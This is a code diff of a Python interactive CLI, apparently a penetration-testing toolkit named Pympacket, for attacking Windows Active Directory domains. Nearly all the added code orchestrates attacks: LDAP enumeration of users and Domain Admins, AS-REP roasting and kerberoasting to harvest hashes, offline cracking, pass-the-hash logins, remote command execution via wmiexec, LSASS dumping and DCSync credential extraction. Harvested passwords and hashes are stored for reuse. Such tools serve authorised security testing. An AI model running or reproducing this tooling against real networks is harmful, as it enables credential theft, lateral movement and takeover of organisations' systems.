@@ -1,20 +1,18 @@
-import cmd
-import argparse
-import re
-from pympacket.utils.bruteforce import bruteforce
-#from pympacket.attacks.GetNPUsersbak import GetUserNoPreAuth
-from pympacket.utils.storage import load_storage, save_storage, Storage
-from pympacket.utils.kerberoasting import kerberoast
 from pympacket.utils.asreproasting import asreproast
-from pympacket.models.common import Hash, CrackedUser, Computer
-from typing import Any
+from pympacket.utils.kerberoasting import kerberoast
+from pympacket.utils.raw_ldap_enum import ldap_enum
+from pympacket.utils.check_admin_smb import check_admin_smb
+from pympacket.utils.storage import Storage, load_storage, save_storage
+from pympacket.utils.lateral import wmiexec
+from pympacket.utils.bruteforce import bruteforce
+from pympacket.utils.dump_lsass import dump_lsass
+from pympacket.utils.dcsync import dcsync
+import argparse
+import cmd
 import os
-from pympacket.utils.raw_ldap_enum import ldap_login
-from pympacket.utils.raw_ldap_enum import domain_sid
-from pympacket.utils.raw_ldap_enum import group_member
-from pympacket.utils.raw_ldap_enum import enum_users
-from pympacket.utils.raw_ldap_enum import enum_computers
-from tabulate import tabulate
+from pympacket.models.common import Domain, Computer
+import re
+from ldap3.core.exceptions import LDAPSocketOpenError
 
 def ipv4_address(value):
     # Regular expression to match an IPv4 address (four octets)
@@ -23,149 +21,518 @@ def ipv4_address(value):
         raise argparse.ArgumentTypeError(f"Invalid IPv4 address: {value}")
     return value
 
-def extract_user(hash: Hash):
-    # Split the hash by `$` to isolate the user@domain part
-    user_realm = hash.value.split('$')[3]
+def ldap_enum_output(ldap, conn, domain_base, domain, dc_ip):
+    domain_info = Domain()
+    domain_info.name = domain
+    try:
+        # Enumerate Domain SID
+        domain_sid = ldap.domain_sid(conn, domain_base)
+        print(f"Domain SID ({domain}): {domain_sid}\n")
+        domain_info.sid = domain_sid
 
-    # Split the user@domain part by `@` to get only the user
-    return user_realm.split('@')[0]
+        # Enumerate Domain Admins
+        domain_admins = ldap.group_member(conn, domain_base, "Domain Admins")
+        print("Members of 'Domain Admins':")
+        for da in domain_admins:
+            print(da)
+        print("")
+
+        domain_info.domain_admins = domain_admins
+
+        # Enumerate Domain Users
+        domain_users = ldap.enum_users(conn, domain_base)
+        print("Domain User Accounts:")
+        for user in domain_users:
+            print("------------------------------------------")
+            print(f"RID: {user['rid']}")
+            print(f"Username: {user['username']}")
+            print(f"Description: {user['description']}")
+            if len(user['memberOf']):
+                groups = ""
+                for group in user['memberOf']:
+                    groups += f"{group}, "
+                groups = groups[:-2]
+            print(f"Groups: {groups}")
+            print(f"AdminCount: {user['adminCount']}")
+        print("------------------------------------------\n")
+
+        # Enumerate Domain Computers
+        computer_objects = []
+        domain_computers = ldap.enum_computers(conn, domain_base, dc_ip)
+        print("Domain Computers:")
+        for computer in domain_computers:
+            current_computer = Computer()
+            current_computer.name = computer['name']
+            current_computer.dns_name = computer['dns_hostname']
+            current_computer.ip_address = computer['ip_address']
+            current_computer.dc = computer['is_dc']
+            if computer['is_dc']:
+                domain_info.dc.append(computer['ip_address'])
+            computer_objects.append(current_computer)
+            print("------------------------------------------")
+            print(f"Computer Name: {computer['name']}")
+            print(f"DNS Hostname: {computer['dns_hostname']}")
+            print(f"IP Address: {computer['ip_address']}")
+            print(f"Domain Controller: {computer['is_dc']}")
+        print("------------------------------------------\n")
+        domain_info.domain_computers = computer_objects
+        return domain_info
+    except LDAPSocketOpenError as e:
+        if str(e).find("invalid server address") >= 0:
+            print("Invalid Domain Name.\n")
+        else:
+            print("Unable to query the LDAP Server for informations.\n")
+        return None
 
 class ImpacketCLI(cmd.Cmd):
-    # Your CLI commands and functionality will go here
     prompt = '>> '
-    intro = 'Welcome to Pympacket. Type "help" for available commands.'  # Your intro message
+    intro = 'Welcome to Pympacket. Type "help" for available commands.' # change
+    selected = None # Currently selected user
     storage: Storage
 
     def __init__(self):
         super().__init__()
         self.storage = load_storage()
 
-    def save_hash(self, data):
-        user = data['username']
-        if 'tgs' in data:
-            hash = Hash(value=data['tgs'], type='tgs')
-        else:
-            hash = Hash(value=data['asrep'], type='asrep')
-        if user not in self.storage.found_users:
-            self.storage.found_users.append(user)
-            self.storage.found_hashes.append(hash)
-        else:
-            self.storage.found_hashes[self.storage.found_users.index(user)] = hash
-        save_storage(self.storage)
+    def save_user(self, users):
+        for user in users:
+            found = False
+            for saved_user in self.storage.users:
+                if user.username == saved_user.username:
+                    found = True
+                    if saved_user.nthash == None and user.nthash != None:
+                        saved_user.nthash = user.nthash
+                    if saved_user.aes256 == None and user.aes256 != None:
+                        saved_user.aes256 = user.aes256
+                    if len(saved_user.krb_hash) == 0 and len(user.krb_hash) > 0:
+                        (saved_user.krb_hash).append(user.krb_hash)
+                    save_storage(self.storage)
+            if not found:
+                self.storage.users.append(user)
+                save_storage(self.storage)
 
-    def save_password(self, password: str, hash: Hash):
-        self.storage.cracked_hashes.append(CrackedUser(username=extract_user(hash), password=password, hash=hash))
-        save_storage(self.storage)
+    def save_domain(self, domain_info):
+        if self.storage.domain_info != None:
+            if domain_info.sid == (self.storage.domain_info).sid:
+                self.storage.domain_info = domain_info
+                save_storage(self.storage)
+            else:
+                print("\nThere is already a different domain saved in memory,")
+                print("to save the new domain you need to wipe all the informations currently stored.")
+                choice = ''
+                while (choice != '1' and choice != '2'):
+                    choice = input("Type (1) to save the new domain and wipe the storage, (2) otherwise: ")
+                    if choice == '1':
+                        print("Wiping the storage and saving the new domain...\n")
+                        self.storage = Storage()
+                        save_storage(self.storage)
+                        self.storage.domain_info = domain_info
+                        save_storage(self.storage)
+                    elif choice == '2':
+                        print("Operation aborted...\n")
+                    else:
+                        print("Invalid choice.")
+        else:
+            self.storage.domain_info = domain_info
+            save_storage(self.storage)
 
-    def save_computer(self, computer_dict):
-        self.storage.computers.append(Computer(name=computer_dict['name'], is_dc=computer_dict['is_dc'], dns_hostname=computer_dict['dns_hostname'],))
+    def do_select_user(self, args):
+        """miammiao."""
+        parser = argparse.ArgumentParser(prog='select_user', description='Select a stored user to use his credentials.')
+        parser.add_argument('-u', '--user', type=str, required=True, help='The username to select.')
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+        found = False
+        for user in self.storage.users:
+            if args.user == user.username:
+                found = True
+                if user.password != None or user.nthash != None:
+                    self.selected = user
+                    self.prompt = f"({user.username}) >> "
+                else:
+                    print("\nA valid user is found in storage, but no credentials are attached to them.\n")
+        
+        if not found:
+            print("\nNo user is found in storage with that exact username.\n")
+
+    def do_deselect_user(self, args):
+        """maomao"""
+        self.selected = None
+        self.prompt = ">> "
 
     def do_enum(self, args):
-        """Get hashes of users with no pre-authentication"""
+        """ Perform Domain Enumeration """
         parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
         parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
-        parser.add_argument('-dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
-
+        parser.add_argument('-dc-ip', type=ipv4_address, required=True, help='The ip address of the domain controller.')
         group = parser.add_argument_group()
-
-        group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
-        group.add_argument('-p', '--password', type=str, required=False, help='The password to test.')
+        group.add_argument('-u', '--username', type=str, required=False, help='The username to use.')
+        group.add_argument('-p', '--password', type=str, required=False, help='The password to use.')
         group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
-        group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing the users to test.')
-        group.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')
-        group.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'spn', 'ldap'] , required=False, default='auto', help='What kind of enumeration to perform.')
-        print()
-
-        try:
-            args = parser.parse_args(args.split())
-            if not (args.username and (args.password or args.nthash)) and not args.wordlist:
-                parser.error("Username and password or a wordlist are required.")
-            if args.type == 'spn' and not (args.username and (args.password or args.nthash)):
-                parser.error("Username and password are required to perform SPNs enumeration.")
-            if args.type == 'ldap' and not (args.username and (args.password or args.nthash)):
-                parser.error("Username and password are required to perform LDAP enumeration.")
-
-            if args.type == 'spn' or (args.type == 'auto' and args.username and (args.password or args.nthash)):
-                print("Beginning LDAP Enumeration:")
-                conn, domain_base = ldap_login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain)
-                print(f"Domain SID: {domain_sid(conn, domain_base)}")
-                print()
-                domain_admins = group_member(conn, domain_base, "Domain Admins")
-                print(f"List of Domain Admins:")
-                for user in domain_admins:
-                     print(user)
-                print()
-                users = enum_users(conn, domain_base)
-                print("Domain Users:")
-                print(tabulate(users, headers="keys", tablefmt="grid"))
-                print()
-                print("Domain Computers:")
-                computers = enum_computers(conn, domain_base, dc_ip=args.dc_ip)
-                print(tabulate(computers, headers="keys", tablefmt="grid"))
-                print()
-
-            if args.type == 'asrep' or (args.type == 'auto'):
-                print("Beginning asreproasting:")
-                if (args.username and (args.password or args.nthash)):
-                    users = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
-                else:
-                    users = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
-                print("Retrieved asrep for the following users:")
-                for user in users:
-                    print(user['username'])
-                    self.save_hash(user)
-                print()
-
-            if args.type == 'spn' or (args.type == 'auto' and args.username and (args.password or args.nthash)):
-                print("Beginning kerberoasting")
-                users = kerberoast(username=args.username, domain=args.domain, dc_ip=args.dc_ip, password=args.password, nthash=args.nthash)
-                print("Retrieved tgs for the following spn:")
-                for user in users:
-                    print(user['username'])
-                    self.save_hash(user)
-                print()
-
-        except SystemExit:
-            print("Invalid arguments. Use 'help enum' for usage details.")
-
-    def do_bruteforce(self, args):
-        """Offline bruteforce found  hashes."""
-        parser = argparse.ArgumentParser(prog='bruteforce', description='Performs an offline bruteforce.')
-
-        parser.add_argument('-w', '--wordlist', type=str, required=True, help='The wordlist containing the users to test.')
-        parser.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'tgs'], required=False, default='auto', help='The wordlist containing the users to test.')
-        parser.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')
+        group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing usernames to test.')
+        group.add_argument('-t', '--type', type=str, choices=['all', 'asrep', 'kerberoast', 'ldap', 'admin'] , required=False, default='all', help='What type of enumeration to perform.')
 
         try:
             args = parser.parse_args(args.split())
         except SystemExit:
-            print("Invalid arguments. Use 'help bruteforce' for usage details.")
             return
 
-        found_passwords = 0
-        
-        for hash in self.storage.found_hashes:
-            if (args.type == hash.type or args.type == 'auto'):
-                password = bruteforce(args.wordlist, hash)
-                if password:
-                    found_passwords+=1
-                    self.save_password(password, hash)
+        if (args.username and (args.password or args.nthash)) or self.selected != None:
+            # Credentialed
+            if args.type == 'all' or args.type == 'ldap':
+                ldap = ldap_enum()
+                if self.selected == None:
+                    if args.nthash == None: # Password login
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
+                else:
+                    if self.selected.password != None:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.nthash, domain=args.domain, pth=True)
 
-        print(f'Cracked {found_passwords} vulnerable hashes.')
+                if conn != None:
+                    domain_info = ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
+                    if domain_info != None:
+                        self.save_domain(domain_info)
 
-    def do_list_hashes(self, args):
-        """List found vulnerable hashes."""
-        for hash in self.storage.found_hashes:
-            print(f'{hash}\n')
-        if len(self.storage.found_hashes) == 0:
-            print('No hashes stored in memory.')
-    
+            if args.type == 'all' or args.type == 'admin':
+                # Enumerate Administrative Privilege
+                ldap = ldap_enum()
+                if self.selected == None:
+                    if args.nthash == None: # Password login
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
+                else:
+                    if self.selected.password != None:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.password, domain=args.domain, pth=False)
+                    else:
+                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.nthash, domain=args.domain, pth=True)
+                
+                if conn != None:
+                    try:
+                        domain_computers = ldap.enum_computers(conn, domain_base, args.dc_ip)
+                    except LDAPSocketOpenError as e:
+                        if str(e).find("invalid server address") >= 0:
+                            print("Invalid Domain Name.\n")
+                        else:
+                            print("Unable to query the LDAP Server for informations.\n")
+                        domain_computers = None
+                    if domain_computers != None:
+                        print("Checking if the current user is a Local Administrator on a Domain Computer:")
+                        admin_on = []
+                        for computer in domain_computers:
+                            if computer['ip_address']:
+                                if self.selected == None:
+                                    if args.nthash == None: # Password login
+                                        result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, password=args.password)
+                                    else:
+                                        result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, nthash=args.nthash)
+                                else:
+                                    if self.selected.password != None:
+                                        result = check_admin_smb(target=computer['ip_address'], username=self.selected.username, domain=args.domain, password=self.selected.password)
+                                    else:
+                                        result = check_admin_smb(target=computer['ip_address'], username=self.selected.username, domain=args.domain, nthash=self.selected.nthash)
+                                if result:
+                                    admin_on.append(computer['name'])
+                    
+                        if len(admin_on):
+                            for pc in admin_on:
+                                print(pc)
+                        else:
+                            print("The current user does not have Local Administrator privileges on any Domain Computer.")
+                        print("")
+
+            if args.type == 'all' or args.type == 'asrep':
+                if self.selected == None:
+                    asrep_out = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+                else:
+                    if self.selected.password != None:
+                        asrep_out = asreproast(dc_ip=args.dc_ip, username=self.selected.username, password=self.selected.password, domain=args.domain)
+                    else:
+                        asrep_out = asreproast(dc_ip=args.dc_ip, username=self.selected.username, nthash=self.selected.nthash, domain=args.domain)
+                        
+                if asrep_out != None:
+                    if len(asrep_out):
+                        print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
+                        for asrep in asrep_out:
+                            print(asrep.username)
+                            self.save_user(asrep_out)
+                        print("")
+                    else:
+                        print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")
+
+            if args.type == 'all' or args.type == 'kerberoast':
+                if self.selected == None:
+                    tgs_out = kerberoast(username=args.username, password=args.password, nthash=args.nthash, dc_ip=args.dc_ip, domain=args.domain)
+                else:
+                    if self.selected.password != None:
+                        tgs_out = kerberoast(dc_ip=args.dc_ip, username=self.selected.username, password=self.selected.password, domain=args.domain)
+                    else:
+                        tgs_out = kerberoast(dc_ip=args.dc_ip, username=self.selected.username, nthash=self.selected.nthash, domain=args.domain)                
+                if tgs_out != None:
+                    if len(tgs_out):
+                        print("Kerberoasted the following users and stored their TGS for future bruteforce:")
+                        for tgs in tgs_out:
+                            print(tgs.username)
+                            self.save_user(tgs_out)
+                        print("")
+                    else:
+                        print("There are no Service Accounts on the target Domain.\n")
+        elif (args.wordlist):
+            # Uncredentialed
+            if args.type == 'all' or args.type == 'asrep':
+                asrep_out = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
+                if asrep_out != None:
+                    if len(asrep_out):
+                        print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
+                        for asrep in asrep_out:
+                            print(asrep.username)
+                            self.save_user(asrep_out)
+                        print("")
+                    else:
+                        print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")
+                
+            if args.type == 'all' or args.type == 'ldap':
+                ldap = ldap_enum()
+                conn, domain_base = ldap.login(target=args.dc_ip, domain=args.domain)
+
+                if conn != None:
+                    domain_info = ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
+                    if domain_info != None:
+                        self.save_domain(domain_info)
+                
+            if args.type == 'kerberoast' or args.type == 'admin':
+                print("You can't perform kerberoasting or check for Local Admin privileges without a valid set of user credentials.\n")
+                return
+        else:
+            print("You must specify an user wordlist to perform uncredentialed enumeration.\n")
+            return
+
+    def do_exec(self, args):
+        """ miao miao miao """
+        parser = argparse.ArgumentParser(prog='exec', description='Execute a command on a system via wmiexec, if enough privileges are provided.')
+        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
+        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip address of the target system.')
+        parser.add_argument('-c', '--cmd', type=str, required=True, help='The command to execute.')
+        group = parser.add_argument_group()
+        group.add_argument('-u', '--username', type=str, required=False, help='The username to use.')
+        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to use.')
+        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
+        group.add_argument('-s', '--shell', type=str, choices=['cmd', 'powershell'] , required=False, default='cmd', help='What kind of shell to spawn.')
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+        if self.selected == None:
+            wmiexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain, cmd=args.cmd, shell_type=args.shell)
+        else:
+            wmiexec(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain, cmd=args.cmd, shell_type=args.shell)
+
+    def do_bruteforce(self, args):
+        """ miao miao miao """
+        parser = argparse.ArgumentParser(prog='bruteforce', description='Performs a wordlist bruteforce against hashes stored in memory.')
+        parser.add_argument('-w', '--wordlist', type=str, required=True, help='The wordlist containing the passwords to test.')
+        parser.add_argument('-t', '--type', type=str, choices=['all', 'asrep', 'tgs'], required=False, default='all', help='The type of hashes to crack.')
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+        cracked_tgs = []
+        cracked_asrep = []
+        for user in self.storage.users:
+            if user.password == None:
+                if len(user.krb_hash):
+                    for hash in user.krb_hash:
+                        if hash.type == 'asrep' and (args.type == 'all' or args.type == 'asrep'):
+                            password = bruteforce(args.wordlist, hash)
+                            if password:
+                                user.password = password
+                                save_storage(self.storage)
+                                cracked_asrep.append(user.username)
+                        if hash.type == 'tgs' and (args.type == 'all' or args.type == 'tgs'):
+                            password = bruteforce(args.wordlist, hash)
+                            if password:
+                                user.password = password
+                                save_storage(self.storage)
+                                cracked_tgs.append(user.username)
+        if len(cracked_asrep):
+            print("Cracked the ASREP Hashes for the following users:")
+            for user in cracked_asrep:
+                print(user)
+            print("")
+        else:
+            print("No ASREP Hashes were able to be cracked.\n")
+
+        if len(cracked_tgs):
+            print("Cracked the TGS Hashes for the following users:")
+            for user in cracked_tgs:
+                print(user)
+            print("")
+        else:
+            print("No TGS Hashes were able to be cracked.\n")
+
     def do_list_users(self, args):
-        """List cracked users credentials."""
-        for user in self.storage.cracked_hashes:
-            print(f'{user}\n')
-        if len(self.storage.cracked_hashes) == 0:
-            print('No users stored in memory.')
+        """List users credentials."""
+        parser = argparse.ArgumentParser(prog='list_users', description='List saved users.')
+        parser.add_argument('--hash', action='store_true', required=False, default=False, help='Display stored asrep/tgs hashes in cleartext.')
+        parser.add_argument('--cleartext', action='store_true', required=False, default=False, help='Display stored password/ntlm/aes256 credentials in cleartext.')
+        parser.add_argument('-f', '--filter', type=str, required=False, help='Username to filter.')
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+        if len(self.storage.users):
+            print("\nCurrently saved Domain Users:")
+            for user in self.storage.users:
+                if args.filter != None and args.filter not in user.username:
+                    continue
+                print(f"Username: {user.username}")
+
+                if user.password != None:
+                    if args.cleartext:
+                        print(f"Password: {user.password}")
+                    else:
+                        print(f"Password: Saved")
+                else:
+                    print("Password: Not saved")
+
+                if user.nthash != None:
+                    if args.cleartext:
+                        print(f"NTLM Hash: {user.nthash}")
+                    else:
+                        print(f"NTLM Hash: Saved")
+                else:
+                    print("NTLM Hash: Not saved")
+
+                if user.aes256 != None:
+                    if args.cleartext:
+                        print(f"AES256 Key: {user.aes256}")
+                    else:
+                        print(f"AES256 Key: Saved")
+                else:
+                    print("AES256 Key: Not saved")
+                
+                if len(user.krb_hash):
+                    if args.hash:
+                        print("Kerberos Hashes:")
+                        for hash in user.krb_hash:
+                            print(f"{hash.type} hash: {hash.value}")
+                    else:
+                        hash_types = "("
+                        for hashes in user.krb_hash:
+                            hash_types += f"{hashes.type}, "
+                        hash_types = hash_types[:-2]
+                        hash_types += ")"
+                        print(f"Kerberos Hash: Saved {hash_types}")
+                else:
+                    print("Kerberos Hash: Not saved")
+                print("")
+        else:
+            print('No users stored in memory.\n')
+
+    def do_domain_info(self, args):
+        """Get saved Domain information."""
+        parser = argparse.ArgumentParser(prog='domain_info', description='Get saved domain information.')
+        parser.add_argument('--computers', action='store_true', required=False, default=False, help='Display detailed computer information.')
+        
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+
+        if self.storage.domain_info != None:
+            print("Domain Information:")
+            print(f"Name: {self.storage.domain_info.name}")
+            print(f"SID: {self.storage.domain_info.sid}")
+            dcs = ""
+            for dc in self.storage.domain_info.dc:
+                dcs += f"{dc}, "
+            dcs = dcs[:-2]
+            print(f"Domain Controllers: {dcs}")
+            if len(self.storage.domain_info.domain_admins):
+                das = ""
+                for da in self.storage.domain_info.domain_admins:
+                    das += f"{da}, "
+                das = das[:-2]
+                print(f"Domain Admins: {das}")
+            if args.computers:
+                print("\nDomain Computers:")
+                for computer in self.storage.domain_info.domain_computers:
+                    print(f"Name: {computer.name}")
+                    print(f"DNS Hostname: {computer.dns_name}")
+                    print(f"IP Address: {computer.ip_address}")
+                    print(f"Domain Controller: {computer.dc}\n")
+            else:
+                print(f"Domain Computers: {len(self.storage.domain_info.domain_computers)}")
+            print("")
+        else:
+            print("No Domain data stored in memory.\n")
+
+    def do_lsass_dump(self, args):
+        """ miao miao miao """
+        parser = argparse.ArgumentParser(prog='lsass_dump', description='Perform a dump of the local lsass process and extracts saved credentials, if enough privileges are provided.')
+        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
+        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip address of the target system.')
+        group = parser.add_argument_group()
+        group.add_argument('-u', '--username', type=str, required=False, default='', help='The username to use.')
+        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to use.')
+        group.add_argument('-nthash', type=str, required=False, default='', help='The NT hash of the user.')
+
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+
+        if self.selected == None:
+            user_creds = dump_lsass(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+        else:
+            user_creds = dump_lsass(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain)                 
+
+        #user_creds = dump_lsass(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+        if user_creds != None:
+            if len(user_creds):
+                print("\nThe following users were extracted from the lsass dump:")
+                for user in user_creds:
+                    print(user.username)
+                print("")
+                self.save_user(user_creds)
+            else:
+                print("No user accounts were extracted from the lsass dump.\n")
+
+    def do_dcsync(self, args):
+        """ miao miao miao """
+        parser = argparse.ArgumentParser(prog='dcsync', description='Perform a DCSync against a Domain Controller and retrieves Domain User credentials from the ntds.dit database, if enough privileges are provided.')
+        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
+        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip address of the domain controller.')
+        group = parser.add_argument_group()
+        group.add_argument('-u', '--username', type=str, required=False, default='', help='The username to use.')
+        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to use.')
+        group.add_argument('-nthash', type=str, required=False, default='', help='The NT hash of the user.')
+
+        try:
+            args = parser.parse_args(args.split())
+        except SystemExit:
+            return
+
+        if self.selected == None:
+            user_creds = dcsync(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+        else:
+            user_creds = dcsync(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain)                 
+
+        if user_creds != None:
+            if len(user_creds):
+                print("\nThe following users were extracted from the dcsync:")
+                for user in user_creds:
+                    print(user.username)
+                print("")
+                self.save_user(user_creds)
+            else:
+                print("No user accounts were extracted from the dcsync.\n")
 
     def do_clear(self, args):
         """Clear the CLI."""
@@ -181,7 +548,19 @@ class ImpacketCLI(cmd.Cmd):
         self.storage = Storage()
         save_storage(self.storage)
 
-    def do_quit(self, line):
+    def do_quit(self, args):
         """Exit the CLI."""
         save_storage(self.storage)
         return True
+
+def main():
+    cli = ImpacketCLI()
+    cli.cmdloop()
+
+# Entry point of the script
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nProgram execution interrupted, not saving stored data...\n")
+    
